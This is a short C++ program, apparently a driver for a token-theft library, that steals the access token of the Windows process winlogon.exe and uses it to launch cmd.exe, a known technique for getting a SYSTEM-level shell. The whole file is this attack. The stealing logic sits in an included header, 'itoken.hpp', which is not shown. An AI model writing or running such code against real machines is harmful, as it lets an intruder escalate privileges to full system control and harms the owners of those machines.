#include "itoken.hpp"

int main() {
	IToken itoken(L"winlogon.exe");

	if (!itoken.steal()) return 1;
	itoken.spawnProcess(L"C:\\Windows\\System32\\cmd.exe");
}